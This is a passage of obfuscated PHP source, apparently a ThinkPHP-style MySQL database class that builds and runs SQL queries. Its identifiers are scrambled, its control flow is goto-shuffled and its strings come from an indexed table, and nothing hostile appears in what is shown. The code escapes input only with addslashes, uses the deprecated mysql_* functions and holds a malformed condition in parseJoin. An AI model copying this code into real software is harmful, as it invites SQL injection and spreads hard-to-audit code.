$Aµú†§–á . $A¢¶÷–œ¬¯[50] . $this->exp[$e´∂†˘Ë…—] . $A¢¶÷–œ¬¯[50] . $this->parseValue($B›¶Èç—Êà[0]) . $A¢¶÷–œ¬¯[972] . $this->parseValue($B›¶Èç—Êà[1]) . $A¢¶÷–œ¬¯[276]; } else { think_exception(think_lang($A¢¶÷–œ¬¯[975]) . $A¢¶÷–œ¬¯[4] . $F£ÛºΩ√ë[0]); } } else { $c∑ï≠Øê“∆ = count($F£ÛºΩ√ë); $b‡ŸÚãÖëÁ = $A¢¶÷–œ¬¯[33]; if (is_string($F£ÛºΩ√ë[$c∑ï≠Øê“∆ - 1])) { $b‡ŸÚãÖëÁ = isset($F£ÛºΩ√ë[$c∑ï≠Øê“∆ - 1]) ? strtoupper($F£ÛºΩ√ë[$c∑ï≠Øê“∆ - 1]) : $A¢¶÷–œ¬¯[33]; if (in_array($b‡ŸÚãÖëÁ, array($A¢¶÷–œ¬¯[969], $A¢¶÷–œ¬¯[970], $A¢¶÷–œ¬¯[971]))) { $c∑ï≠Øê“∆ = $c∑ï≠Øê“∆ - 1; } } else { $b‡ŸÚãÖëÁ = $A¢¶÷–œ¬¯[969]; } for ($bﬂ«±ã¿´Í = 0; $bﬂ«±ã¿´Í < $c∑ï≠Øê“∆; $bﬂ«±ã¿´Í++) { $B›¶Èç—Êà = is_array($F£ÛºΩ√ë[$bﬂ«±ã¿´Í]) ? $F£ÛºΩ√ë[$bﬂ«±ã¿´Í][1] : $F£ÛºΩ√ë[$bﬂ«±ã¿´Í]; if ($A¢¶÷–œ¬¯[295] == strtolower($F£ÛºΩ√ë[$bﬂ«±ã¿´Í][0])) { $cÖ™∂‚∫Ó– .= $A¢¶÷–œ¬¯[258] . $Aµú†§–á . $A¢¶÷–œ¬¯[50] . $B›¶Èç—Êà . $A¢¶÷–œ¬¯[986] . $b‡ŸÚãÖëÁ . $A¢¶÷–œ¬¯[50]; } else { $c≤Ûê§Ó˘∆ = is_array($F£ÛºΩ√ë[$bﬂ«±ã¿´Í]) ? $this->exp[strtolower($F£ÛºΩ√ë[$bﬂ«±ã¿´Í][0])] : $A¢¶÷–œ¬¯[962]; if (!$c≤Ûê§Ó˘∆ && is_array($F£ÛºΩ√ë[$bﬂ«±ã¿´Í]) && in_array($F£ÛºΩ√ë[$bﬂ«±ã¿´Í][0], array($A¢¶÷–œ¬¯[962], $A¢¶÷–œ¬¯[979], $A¢¶÷–œ¬¯[980], $A¢¶÷–œ¬¯[981], $A¢¶÷–œ¬¯[982], $A¢¶÷–œ¬¯[983]))) { $c≤Ûê§Ó˘∆ = $F£ÛºΩ√ë[$bﬂ«±ã¿´Í][0]; } $cÖ™∂‚∫Ó– .= $A¢¶÷–œ¬¯[258] . $Aµú†§–á . $A¢¶÷–œ¬¯[50] . $c≤Ûê§Ó˘∆ . $A¢¶÷–œ¬¯[50] . $this->parseValue($B›¶Èç—Êà) . $A¢¶÷–œ¬¯[986] . $b‡ŸÚãÖëÁ . $A¢¶÷–œ¬¯[50]; } } $cÖ™∂‚∫Ó– = substr($cÖ™∂‚∫Ó–, 0, -4); } } else { $cÖ™∂‚∫Ó– .= $Aµú†§–á . $A¢¶÷–œ¬¯[990] . $this->parseValue($F£ÛºΩ√ë); } return $cÖ™∂‚∫Ó–; } protected function parseThinkWhere($D£ñπÇ≈ÌÀ, $a´‰«Ôß‘ ) { $DõÈ—ã„∑· =& $_SERVER[Öíæ€“”≠éÏË]; $c∏≤™…¡ü = $DõÈ—ã„∑·[33]; switch ($D£ñπÇ≈ÌÀ) { case $DõÈ—ã„∑·[350]: $c∏≤™…¡ü = $a´‰«Ôß‘ ; break; case $DõÈ—ã„∑·[973]: $c∏≤™…¡ü = is_string($a´‰«Ôß‘ ) ? $a´‰«Ôß‘  : substr($this->parseWhere($a´‰«Ôß‘ ), 6); break; case $DõÈ—ã„∑·[991]: parse_str($a´‰«Ôß‘ , $aÉ‡Ö√öÓ); if (isset($aÉ‡Ö√öÓ[$DõÈ—ã„∑·[968]])) { $Cîœ—ØúÚ‚ = $DõÈ—ã„∑·[50] . strtoupper($aÉ‡Ö√öÓ[$DõÈ—ã„∑·[968]]) . $DõÈ—ã„∑·[50]; unset($aÉ‡Ö√öÓ[$DõÈ—ã„∑·[968]]); } else { $Cîœ—ØúÚ‚ = $DõÈ—ã„∑·[972]; } $CßÈÃÔÿ“ü = array(); foreach ($aÉ‡Ö√öÓ as $cëŒî·‘¿√ => $a˘ºÇŸä√ù) { $CßÈÃÔÿ“ü[] = $this->parseKey($cëŒî·‘¿√) . $DõÈ—ã„∑·[990] . $this->parseValue($a˘ºÇŸä√ù); } $c∏≤™…¡ü = implode($Cîœ—ØúÚ‚, $CßÈÃÔÿ“ü); break; } return $c∏≤™…¡ü; } protected function parseLimit($bœÆ»ë÷†Ó) { $a∏¶‡˘ïæ¯ =& $_SERVER[Öíæ€“”≠éÏË]; return !empty($bœÆ»ë÷†Ó) ? $a∏¶‡˘ïæ¯[48] . $bœÆ»ë÷†Ó . $a∏¶‡˘ïæ¯[50] : $a∏¶‡˘ïæ¯[33]; } protected function parseJoin($DÙÜçºÍãà) { $fú∞ÿµÓ¬ª =& $_SERVER[Öíæ€“”≠éÏË]; $F¨èç±≠î’ = $fú∞ÿµÓ¬ª[33]; if (!empty($DÙÜçºÍãà)) { if (is_array($DÙÜçºÍãà)) { foreach ($DÙÜçºÍãà as $aã”æØÑÆÖ => $bê∫åâ§≤) { if (!1 !== stripos($bê∫åâ§≤, $fú∞ÿµÓ¬ª[992])) { $F¨èç±≠î’ .= $fú∞ÿµÓ¬ª[50] . $bê∫åâ§≤; } else { $F¨èç±≠î’ .= $fú∞ÿµÓ¬ª[993] . $bê∫åâ§≤; } } } else { $F¨èç±≠î’ .= $fú∞ÿµÓ¬ª[993] . $DÙÜçºÍãà; } } $F¨èç±≠î’ = preg_replace($fú∞ÿµÓ¬ª[994], think_config($fú∞ÿµÓ¬ª[900]) . $fú∞ÿµÓ¬ª[995], $F¨èç±≠î’); return $F¨èç±≠î’; } protected function parseOrder($aæÀ”ÇŸÉÔ) { $cÁ˘∑∫™âŸ =& $_SERVER[Öíæ€“”≠éÏË]; if (is_array($aæÀ”ÇŸÉÔ)) { $CÓËÎÇÂµ‘ = array(); foreach ($aæÀ”ÇŸÉÔ as $c¥ÀîÙ·Éö => $FŸ¬Ø¿éŒÆ) { if (is_numeric($c¥ÀîÙ·Éö)) { $CÓËÎÇÂµ‘[] = $this->parseKey($FŸ¬Ø¿éŒÆ); } else { $FŸ¬Ø¿éŒÆ = in_array(strtoupper(trim($FŸ¬Ø¿éŒÆ)), array($cÁ˘∑∫™âŸ[996], $cÁ˘∑∫™âŸ[997])) ? $cÁ˘∑∫™âŸ[50] . $FŸ¬Ø¿éŒÆ : $cÁ˘∑∫™âŸ[33]; if (preg_match($cÁ˘∑∫™âŸ[998], $c¥ÀîÙ·Éö)) { $CÓËÎÇÂµ‘[] = $this->parseKey($c¥ÀîÙ·Éö) . $FŸ¬Ø¿éŒÆ; } else { think_exception($cÁ˘∑∫™âŸ[999] . $c¥ÀîÙ·Éö); } } } $aæÀ”ÇŸÉÔ = implode($cÁ˘∑∫™âŸ[47], $CÓËÎÇÂµ‘); } return !empty($aæÀ”ÇŸÉÔ) ? $cÁ˘∑∫™âŸ[1000] . $aæÀ”ÇŸÉÔ : $cÁ˘∑∫™âŸ[33]; } protected function parseGroup($C∑ù°ÀÛﬂ—) { $CÕ¿•π˜òå =& $_SERVER[Öíæ€“”≠éÏË]; return !empty($C∑ù°ÀÛﬂ—) ? $CÕ¿•π˜òå[1001] . $C∑ù°ÀÛﬂ— : $CÕ¿•π˜òå[33]; } protected function parseHaving($F÷‰·Ω©ï£) { $f©ıíâëËÙ =& $_SERVER[Öíæ€“”≠éÏË]; return !empty($F÷‰·Ω©ï£) ? $f©ıíâëËÙ[1002] . $F÷‰·Ω©ï£ : $f©ıíâëËÙ[33]; } protected function parseComment($a◊áÎÇÜ·±) { $eåÖ◊†Î∏ç =& $_SERVER[Öíæ€“”≠éÏË]; return !empty($a◊áÎÇÜ·±) ? $eåÖ◊†Î∏ç[1003] . $a◊áÎÇÜ·± . $eåÖ◊†Î∏ç[1004] : $eåÖ◊†Î∏ç[33]; } protected function parseDistinct($Bøß‰ó«Óﬂ) { $f≠Ï÷î°á¢ =& $_SERVER[Öíæ€“”≠éÏË]; return !empty($Bøß‰ó«Óﬂ) ? $f≠Ï÷î°á¢[1005] : $f≠Ï÷î°á¢[33]; } protected function parseUnion($Eè∏Ü≥Ö∑) { $Aµœîø“»â =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($Eè∏Ü≥Ö∑)) { return $Aµœîø“»â[33]; } if (isset($Eè∏Ü≥Ö∑[$Aµœîø“»â[346]])) { $FõÀŸùéöÌ = $Aµœîø“»â[1006]; unset($Eè∏Ü≥Ö∑[$Aµœîø“»â[346]]); } else { $FõÀŸùéöÌ = $Aµœîø“»â[1007]; } foreach ($Eè∏Ü≥Ö∑ as $Câ¿Ô‡œ„ã) { $D·Î¯ÈËäÂ[] = $FõÀŸùéöÌ . (is_array($Câ¿Ô‡œ„ã) ? $this->buildSelectSql($Câ¿Ô‡œ„ã) : $Câ¿Ô‡œ„ã); } return implode($Aµœîø“»â[50], $D·Î¯ÈËäÂ); } public function insert($a≈´‘∞≠◊ä, $A“´∫óí∂È = array(), $c—∫ÒÒ∞‚ˆ = false) { goto Aœí°ï÷ˆá; A…À©¥∞˜æ: foreach ($a≈´‘∞≠◊ä as $dºË„Ë•ô¢ => $EÉ£Ã÷¬â‰) { if (is_array($EÉ£Ã÷¬â‰) && $Bà€ôÓ∫à÷[295] == $EÉ£Ã÷¬â‰[0]) { $D¡ä¯€ŸïÀ[] = $this->parseKey($dºË„Ë•ô¢); $BØ‹∞‡Æ€[] = $EÉ£Ã÷¬â‰[1]; } elseif (is_scalar($EÉ£Ã÷¬â‰) || is_null($EÉ£Ã÷¬â‰)) { $D¡ä¯€ŸïÀ[] = $this->parseKey($dºË„Ë•ô¢); $BØ‹∞‡Æ€[] = $this->parseValue($EÉ£Ã÷¬â‰); } } $cıö¢‹∞ÚË = ($c—∫ÒÒ∞‚ˆ ? $Bà€ôÓ∫à÷[878] : $Bà€ôÓ∫à÷[879]) . $Bà€ôÓ∫à÷[880] . $this->parseTable($A“´∫óí∂È[$Bà€ôÓ∫à÷[277]]) . $Bà€ôÓ∫à÷[874] . implode($Bà€ôÓ∫à÷[47], $D¡ä¯€ŸïÀ) . $Bà€ôÓ∫à÷[875] . implode($Bà€ôÓ∫à÷[47], $BØ‹∞‡Æ€) . $Bà€ôÓ∫à÷[876]; $cıö¢‹∞ÚË .= $this->parseLock(isset($A“´∫óí∂È[$Bà€ôÓ∫à÷[825]]) ? $A“´∫óí∂È[$Bà€ôÓ∫à÷[825]] : !1); goto Bãˆ£¿∏èá; Aœí°ï÷ˆá: $Bà€ôÓ∫à÷ =& $_SERVER[Öíæ€“”≠éÏË]; $BØ‹∞‡Æ€ = $D¡ä¯€ŸïÀ = array(); $this->model = $A“´∫óí∂È[$Bà€ôÓ∫à÷[279]]; goto A…À©¥∞˜æ; Bãˆ£¿∏èá: $cıö¢‹∞ÚË .= $this->parseComment(!empty($A“´∫óí∂È[$Bà€ôÓ∫à÷[352]]) ? $A“´∫óí∂È[$Bà€ôÓ∫à÷[352]] : $Bà€ôÓ∫à÷[33]); return $this->execute($cıö¢‹∞ÚË, $this->parseBind(!empty($A“´∫óí∂È[$Bà€ôÓ∫à÷[283]]) ? $A“´∫óí∂È[$Bà€ôÓ∫à÷[283]] : array())); goto D∫‡–ê„‘Û; D∫‡–ê„‘Û: } public function selectInsert($B≤∫Ô¨àÔç, $A–’í£¬éœ, $D≥›º“œÒ— = array()) { goto EêÒÙîÈ›µ; Dô£ãÌï«„: array_walk($B≤∫Ô¨àÔç, array($this, $cÖπ™¬åÑÉ[877])); $d∆§”πÖ´Ç = $cÖπ™¬åÑÉ[1008] . $this->parseTable($A–’í£¬éœ) . $cÖπ™¬åÑÉ[874] . implode($cÖπ™¬åÑÉ[47], $B≤∫Ô¨àÔç) . $cÖπ™¬åÑÉ[986]; $d∆§”πÖ´Ç .= $this->buildSelectSql($D≥›º“œÒ—); goto BøﬂàëÙ∑•; BøﬂàëÙ∑•: return $this->execute($d∆§”πÖ´Ç, $this->parseBind(!empty($D≥›º“œÒ—[$cÖπ™¬åÑÉ[283]]) ? $D≥›º“œÒ—[$cÖπ™¬åÑÉ[283]] : array())); goto e„éå˜È¨Ï; EêÒÙîÈ›µ: $cÖπ™¬åÑÉ =& $_SERVER[Öíæ€“”≠éÏË]; $this->model = $D≥›º“œÒ—[$cÖπ™¬åÑÉ[279]]; if (is_string($B≤∫Ô¨àÔç)) { $B≤∫Ô¨àÔç = explode($cÖπ™¬åÑÉ[47], $B≤∫Ô¨àÔç); } goto Dô£ãÌï«„; e„éå˜È¨Ï: } public function update($a«ˆÁ¡ˆî˜, $a‹√Êıá£¿) { $d√≥∞‰ÉÕ” =& $_SERVER[Öíæ€“”≠éÏË]; $this->model = $a‹√Êıá£¿[$d√≥∞‰ÉÕ”[279]]; $EíúÒóÌèü = $d√≥∞‰ÉÕ”[1009] . $this->parseTable($a‹√Êıá£¿[$d√≥∞‰ÉÕ”[277]]) . $this->parseSet($a«ˆÁ¡ˆî˜) . $this->parseWhere(!empty($a‹√Êıá£¿[$d√≥∞‰ÉÕ”[273]]) ? $a‹√Êıá£¿[$d√≥∞‰ÉÕ”[273]] : $d√≥∞‰ÉÕ”[33]) . $this->parseOrder(!empty($a‹√Êıá£¿[$d√≥∞‰ÉÕ”[363]]) ? $a‹√Êıá£¿[$d√≥∞‰ÉÕ”[363]] : $d√≥∞‰ÉÕ”[33]) . $this->parseLimit(!empty($a‹√Êıá£¿[$d√≥∞‰ÉÕ”[290]]) ? $a‹√Êıá£¿[$d√≥∞‰ÉÕ”[290]] : $d√≥∞‰ÉÕ”[33]) . $this->parseLock(isset($a‹√Êıá£¿[$d√≥∞‰ÉÕ”[825]]) ? $a‹√Êıá£¿[$d√≥∞‰ÉÕ”[825]] : !1) . $this->parseComment(!empty($a‹√Êıá£¿[$d√≥∞‰ÉÕ”[352]]) ? $a‹√Êıá£¿[$d√≥∞‰ÉÕ”[352]] : $d√≥∞‰ÉÕ”[33]); return $this->execute($EíúÒóÌèü, $this->parseBind(!empty($a‹√Êıá£¿[$d√≥∞‰ÉÕ”[283]]) ? $a‹√Êıá£¿[$d√≥∞‰ÉÕ”[283]] : array())); } public function delete($f…Ÿ—ö“Æ¯ = array()) { $a£ÑÎ∑Ö÷à =& $_SERVER[Öíæ€“”≠éÏË]; $this->model = $f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[279]]; $B »ê¥Õ–≠ = $a£ÑÎ∑Ö÷à[1010] . $this->parseTable($f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[277]]) . $this->parseWhere(!empty($f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[273]]) ? $f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[273]] : $a£ÑÎ∑Ö÷à[33]) . $this->parseOrder(!empty($f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[363]]) ? $f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[363]] : $a£ÑÎ∑Ö÷à[33]) . $this->parseLimit(!empty($f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[290]]) ? $f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[290]] : $a£ÑÎ∑Ö÷à[33]) . $this->parseLock(isset($f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[825]]) ? $f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[825]] : !1) . $this->parseComment(!empty($f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[352]]) ? $f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[352]] : $a£ÑÎ∑Ö÷à[33]); return $this->execute($B »ê¥Õ–≠, $this->parseBind(!empty($f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[283]]) ? $f…Ÿ—ö“Æ¯[$a£ÑÎ∑Ö÷à[283]] : array())); } public function select($fÙ◊∫¬£Âè = array()) { goto BÆÿ÷’¨ƒ°; BÆÿ÷’¨ƒ°: $C«≥¬ƒº“• =& $_SERVER[Öíæ€“”≠éÏË]; $this->model = $fÙ◊∫¬£Âè[$C«≥¬ƒº“•[279]]; $a„ëó„å≈• = $this->buildSelectSql($fÙ◊∫¬£Âè); goto AËÌøÉÏÑ‘; FÁƒ´º◊êÉ: if ($EÏÖˆ–ã›ö && !1 !== $eè¡ÀÉ∫ÆÙ) { think_cache($EŒÜ±è™…ù, $eè¡ÀÉ∫ÆÙ, $EÏÖˆ–ã›ö); } return $eè¡ÀÉ∫ÆÙ; goto Cãì∫ÉÒö; AËÌøÉÏÑ‘: $EÏÖˆ–ã›ö = isset($fÙ◊∫¬£Âè[$C«≥¬ƒº“•[347]]) ? $fÙ◊∫¬£Âè[$C«≥¬ƒº“•[347]] : !1; if ($EÏÖˆ–ã›ö) { $EŒÜ±è™…ù = is_string($EÏÖˆ–ã›ö[$C«≥¬ƒº“•[93]]) ? $EÏÖˆ–ã›ö[$C«≥¬ƒº“•[93]] : $C«≥¬ƒº“•[1011] . md5($a„ëó„å≈•); $BÀ◊óÜËœ◊ = think_cache($EŒÜ±è™…ù, $C«≥¬ƒº“•[33], $EÏÖˆ–ã›ö); if (!1 !== $BÀ◊óÜËœ◊) { return $BÀ◊óÜËœ◊; } } $eè¡ÀÉ∫ÆÙ = $this->query($a„ëó„å≈•, $this->parseBind(!empty($fÙ◊∫¬£Âè[$C«≥¬ƒº“•[283]]) ? $fÙ◊∫¬£Âè[$C«≥¬ƒº“•[283]] : array())); goto FÁƒ´º◊êÉ; Cãì∫ÉÒö: } public function buildSelectSql($f‰∞óﬂÕ÷« = array()) { goto AÎä»£—∏«; bÉàó§’»°: $C∏ú∏⁄Ü≈á = $this->parseSql($this->selectSql, $f‰∞óﬂÕ÷«); $C∏ú∏⁄Ü≈á .= $this->parseLock(isset($f‰∞óﬂÕ÷«[$aÛ⁄á”‰ª«[825]]) ? $f‰∞óﬂÕ÷«[$aÛ⁄á”‰ª«[825]] : !1); if (isset($cáŒ˜«û˜é)) { think_cache($cáŒ˜«û˜é, $C∏ú∏⁄Ü≈á); } goto dñòúÎ„Ã÷; AÎä»£—∏«: $aÛ⁄á”‰ª« =& $_SERVER[Öíæ€“”≠éÏË]; if (isset($f‰∞óﬂÕ÷«[$aÛ⁄á”‰ª«[351]])) { if (strpos($f‰∞óﬂÕ÷«[$aÛ⁄á”‰ª«[351]], $aÛ⁄á”‰ª«[47])) { list($BÕ ¡¶√¨à, $bèÿªºËŸ¯) = explode($aÛ⁄á”‰ª«[47], $f‰∞óﬂÕ÷«[$aÛ⁄á”‰ª«[351]]); } else { $BÕ ¡¶√¨à = $f‰∞óﬂÕ÷«[$aÛ⁄á”‰ª«[351]]; } $BÕ ¡¶√¨à = $BÕ ¡¶√¨à ? $BÕ ¡¶√¨à : 1; $bèÿªºËŸ¯ = isset($bèÿªºËŸ¯) ? $bèÿªºËŸ¯ : (is_numeric($f‰∞óﬂÕ÷«[$aÛ⁄á”‰ª«[290]]) ? $f‰∞óﬂÕ÷«[$aÛ⁄á”‰ª«[290]] : 20); $fï˜√¨Üñ√ = $bèÿªºËŸ¯ * ((int) $BÕ ¡¶√¨à - 1); $f‰∞óﬂÕ÷«[$aÛ⁄á”‰ª«[290]] = $fï˜√¨Üñ√ . $aÛ⁄á”‰ª«[47] . $bèÿªºËŸ¯; } if (think_config($aÛ⁄á”‰ª«[1012])) { $cáŒ˜«û˜é = $aÛ⁄á”‰ª«[1013] . md5(serialize($f‰∞óﬂÕ÷«)); $cé∏˜ßëÖÔ = think_cache($cáŒ˜«û˜é); if ($cé∏˜ßëÖÔ) { return $cé∏˜ßëÖÔ; } } goto bÉàó§’»°; dñòúÎ„Ã÷: return $C∏ú∏⁄Ü≈á; goto aîŒ£Á’·ê; aîŒ£Á’·ê: } public function parseSql($aÇ‘¥ÍÔ˘ó, $dâöÖﬁﬁΩ± = array()) { $C»∆„È…¯· =& $_SERVER[Öíæ€“”≠éÏË]; $aÇ‘¥ÍÔ˘ó = str_replace(array($C»∆„È…¯·[1014], $C»∆„È…¯·[1015], $C»∆„È…¯·[1016], $C»∆„È…¯·[1017], $C»∆„È…¯·[1018], $C»∆„È…¯·[1019], $C»∆„È…¯·[1020], $C»∆„È…¯·[1021], $C»∆„È…¯·[1022], $C»∆„È…¯·[1023], $C»∆„È…¯·[1024]), array($this->parseTable("{$dâöÖﬁﬁΩ±[$C»∆„È…¯·[277]]}"), $this->parseDistinct(isset($dâöÖﬁﬁΩ±[$C»∆„È…¯·[1025]]) ? $dâöÖﬁﬁΩ±[$C»∆„È…¯·[1025]] : !1), $this->parseField(!empty($dâöÖﬁﬁΩ±[$C»∆„È…¯·[271]]) ? $dâöÖﬁﬁΩ±[$C»∆„È…¯·[271]] : $C»∆„È…¯·[182]), $this->parseJoin(!empty($dâöÖﬁﬁΩ±[$C»∆„È…¯·[280]]) ? $dâöÖﬁﬁΩ±[$C»∆„È…¯·[280]] : $C»∆„È…¯·[33]), $this->parseWhere(!empty($dâöÖﬁﬁΩ±[$C»∆„È…¯·[273]]) ? $dâöÖﬁﬁΩ±[$C»∆„È…¯·[273]] : $C»∆„È…¯·[33]), $this->parseGroup(!empty($dâöÖﬁﬁΩ±[$C»∆„È…¯·[497]]) ? $dâöÖﬁﬁΩ±[$C»∆„È…¯·[497]] : $C»∆„È…¯·[33]), $this->parseHaving(!empty($dâöÖﬁﬁΩ±[$C»∆„È…¯·[1026]]) ? $dâöÖﬁﬁΩ±[$C»∆„È…¯·[1026]] : $C»∆„È…¯·[33]), $this->parseOrder(!empty($dâöÖﬁﬁΩ±[$C»∆„È…¯·[363]]) ? $dâöÖﬁﬁΩ±[$C»∆„È…¯·[363]] : $C»∆„È…¯·[33]), $this->parseLimit(!empty($dâöÖﬁﬁΩ±[$C»∆„È…¯·[290]]) ? $dâöÖﬁﬁΩ±[$C»∆„È…¯·[290]] : $C»∆„È…¯·[33]), $this->parseUnion(!empty($dâöÖﬁﬁΩ±[$C»∆„È…¯·[345]]) ? $dâöÖﬁﬁΩ±[$C»∆„È…¯·[345]] : $C»∆„È…¯·[33]), $this->parseComment(!empty($dâöÖﬁﬁΩ±[$C»∆„È…¯·[352]]) ? $dâöÖﬁﬁΩ±[$C»∆„È…¯·[352]] : $C»∆„È…¯·[33])), $aÇ‘¥ÍÔ˘ó); return $aÇ‘¥ÍÔ˘ó; } public function getLastSql($fäÇ€Ùˆó† = '') { return $fäÇ€Ùˆó† ? $this->modelSql[$fäÇ€Ùˆó†] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Aá÷ÛÍ€ö‚) { return addslashes($Aá÷ÛÍ€ö‚); } public function setModel($dÇÓø≠πß…) { $this->model = $dÇÓø≠πß…; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto eêàÇÀÀ√”; dˆÈ—ß√Îé: class DbMysql extends Db { public function __construct($añß¯±ï®ÿ = '') { $E»˜≈ÆÔ¿© =& $_SERVER[Öíæ€“”≠éÏË]; if (!extension_loaded($E»˜≈ÆÔ¿©[772])) { think_exception(think_lang($E»˜≈ÆÔ¿©[10]) . $E»˜≈ÆÔ¿©[856]); } if (!empty($añß¯±ï®ÿ)) { $this->config = $añß¯±ï®ÿ; if (empty($this->config[$E»˜≈ÆÔ¿©[13]])) { $this->config[$E»˜≈ÆÔ¿©[13]] = $E»˜≈ÆÔ¿©[33]; } } } public function connect($EÆƒõœ˘çî = '', $fçºëü…ÿ  = 0, $cô˘ë¡ö§° = false) { $D˘Ç†ÿ∞≥´ =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($this->linkID[$fçºëü…ÿ ])) { goto E‘äÜËâß–; Eøﬁ¨∏ì«Ω: if ($fùÑºé∏Í§) { $this->linkID[$fçºëü…ÿ ] = mysql_pconnect($b≈úõâÉÂå, $EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[859]], $EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[860]], 131072); } else { $this->linkID[$fçºëü…ÿ ] = mysql_connect($b≈úõâÉÂå, $EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[859]], $EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[860]], !0, 131072); } if (!$this->linkID[$fçºëü…ÿ ] || !empty($EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[17]]) && !mysql_select_db($EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[17]], $this->linkID[$fçºëü…ÿ ])) { think_exception(mysql_error()); } $FﬂàÓúöÒﬁ = mysql_get_server_info($this->linkID[$fçºëü…ÿ ]); goto CàΩÑ£ÀÑû; E‘äÜËâß–: if (empty($EÆƒõœ˘çî)) { $EÆƒõœ˘çî = $this->config; } $b≈úõâÉÂå = $EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[857]] . ($EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[858]] ? "\72{$EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[858]]}" : $D˘Ç†ÿ∞≥´[33]); $fùÑºé∏Í§ = !empty($EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[13]][$D˘Ç†ÿ∞≥´[14]]) ? $EÆƒõœ˘çî[$D˘Ç†ÿ∞≥´[13]][$D˘Ç†ÿ∞≥´[14]] : $this->pconnect; goto Eøﬁ¨∏ì«Ω; bÕ≈»‡Ê±ß: if (1 != think_config($D˘Ç†ÿ∞≥´[18])) { unset($this->config); } goto BÁ°°ÒÁﬂó; CàΩÑ£ÀÑû: mysql_query($D˘Ç†ÿ∞≥´[861] . think_config($D˘Ç†ÿ∞≥´[862]) . $D˘Ç†ÿ∞≥´[55], $this->linkID[$fçºëü…ÿ ]); if ($FﬂàÓúöÒﬁ > $D˘Ç†ÿ∞≥´[863]) { mysql_query($D˘Ç†ÿ∞≥´[864], $this->linkID[$fçºëü…ÿ ]); } $this->connected = !0; goto bÕ≈»‡Ê±ß; BÁ°°ÒÁﬂó: } return $this->linkID[$fçºëü…ÿ ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($CÏâ¬ää”Ω) { goto f€∫´‡‹‚⁄; CÌè°¬ØﬂÍ: if (!$this->_linkID) { return !1; } $this->queryStr = $CÏâ¬ää”Ω; if ($this->queryID) { $this->free(); } goto e‰«Óé¥õ; c±á™ùë≈ê: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto eﬂÕ†é´Õπ; e‰«Óé¥õ: think_action_status($E€·óºÑºõ[19], 1); think_status($E€·óºÑºõ[20]); $this->queryID = mysql_query($CÏâ¬ää”Ω, $this->_linkID); goto c±á™ùë≈ê; f€∫´‡‹‚⁄: $E€·óºÑºõ =& $_SERVER[Öíæ€“”≠éÏË]; if (0 === stripos($CÏâ¬ää”Ω, $E€·óºÑºõ[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto CÌè°¬ØﬂÍ; eﬂÕ†é´Õπ: } public function execute($cà…´îóû¢) { goto Eè†∆˜ÖÜ“; cô◊°å¯¯ÿ: $this->queryStr = $cà…´îóû¢; if ($this->queryID) { $this->free(); } think_action_status($FòâŒö∞™î[21], 1); goto Eƒ∏ÆﬁÊ•∏; F‰ë™ñ›ÑÆ: if (!1 === $F˘Ö«ãœÎÊ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto Dà‰◊≈«£ï; Eè†∆˜ÖÜ“: $FòâŒö∞™î =& $_SERVER[Öíæ€“”≠éÏË]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cô◊°å¯¯ÿ; Eƒ∏ÆﬁÊ•∏: think_status($FòâŒö∞™î[20]); $F˘Ö«ãœÎÊ = mysql_query($cà…´îóû¢, $this->_linkID); $this->debug(); goto F‰ë™ñ›ÑÆ; Dà‰◊≈«£ï: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Öíæ€“”≠éÏË][865], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fù‘ÛÖâı¯ = mysql_query($_SERVER[Öíæ€“”≠éÏË][866], $this->_linkID); $this->transTimes = 0; if (!$fù‘ÛÖâı¯) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $E…„≈ÛÌíŸ = mysql_query($_SERVER[Öíæ€“”≠éÏË][867], $this->_linkID); $this->transTimes = 0; if (!$E…„≈ÛÌíŸ) { $this->error(); return !1; } } return !0; } private function getAll() { $BÚÎî¢’é = array(); if ($this->numRows > 0) { while ($A®äÕÎÂ¬“ = mysql_fetch_assoc($this->queryID)) { $BÚÎî¢’é[] = $A®äÕÎÂ¬“; } mysql_data_seek($this->queryID, 0); } return $BÚÎî¢’é; } public function getFields($FªÉäÿÕÓƒ) { $C¶¡Ãã»Çƒ =& $_SERVER[Öíæ€“”≠éÏË]; $Eà¢∞π∂âá = $this->query($C¶¡Ãã»Çƒ[868] . $this->parseKey($FªÉäÿÕÓƒ)); $b¡πûàóÈ– = array(); if ($Eà¢∞π∂âá) { foreach ($Eà¢∞π∂âá 